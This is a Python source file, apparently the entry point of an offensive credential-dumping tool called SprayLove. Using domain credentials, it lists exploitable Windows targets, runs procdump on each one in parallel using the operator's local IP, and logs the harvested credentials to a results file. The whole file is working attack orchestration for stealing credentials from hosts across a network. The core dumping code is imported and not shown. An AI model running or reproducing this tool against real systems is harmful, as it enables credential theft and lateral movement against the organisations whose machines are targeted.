# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging, queue
from core.User import *
from core.Resources import *
from core.Targets import *
from core.SprayLove import *
from core.Colors import *
from core.Utils import *
from multiprocessing import Process

def run(args):
    jobs = []

    user = User(args.domain, args.username, args.password)
    local_ip = retrieveMyIP()

    try:
        targets = listPwnableTargets(args.targets, user)

        logging.warning("%sExec procdump on targets. Be patients..." % (warningGre))

        for target in targets:
            jobs.append(Process(target=sprayLove, args=(user, target, local_ip)))
            jobs[-1].start()

        joinThreads(jobs, 30) # wait 30 seconds max
        logging.info("\n%sCredentials logged into: %s" % (warningGre, os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'results', 'creds.txt')))

    except KeyboardInterrupt:
        logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
    except Exception as e:
        logging.warning("%sErr: %s" % (warningRed, e))
    finally:
        exit_gracefully(jobs, 10)
